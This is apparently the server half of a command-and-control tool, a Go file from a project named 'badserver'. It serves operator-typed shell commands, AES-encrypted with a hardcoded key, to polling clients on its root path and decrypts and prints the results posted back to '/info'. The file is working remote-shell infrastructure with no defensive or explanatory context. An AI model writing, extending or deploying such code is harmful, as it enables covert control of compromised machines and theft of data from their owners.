package srv

import (
	"badserver/modules/encoder"
	"bufio"
	"fmt"
	"github.com/labstack/echo/v4"
	"github.com/labstack/gommon/color"
	"io/ioutil"
	"net/http"
	"os"
)

func ServerStart(port string) {
	key := "testlongkeytestlongkeytestlongke"
	server := echo.New()

	server.GET("/", func(c echo.Context) error {
		lector := bufio.NewReader(os.Stdin)
		fmt.Print("Shell > ")
		command, _ := lector.ReadString('\n')

		ccommand := encoder.EncoderAES([]byte(key), command)

		println(color.Red("Sending command"))

		return c.String(http.StatusOK, ccommand)

	})

	server.POST("/info", func(c echo.Context) error {
		var body []byte

		if c.Request().Body != nil {
			body, _ = ioutil.ReadAll(c.Request().Body)

			bodydec := encoder.DecoderAES([]byte(key), body)

			println(">> " + color.Yellow(string(bodydec)))
		}
		return nil
	})

	server.Logger.Fatal(server.Start(":" + port))
}
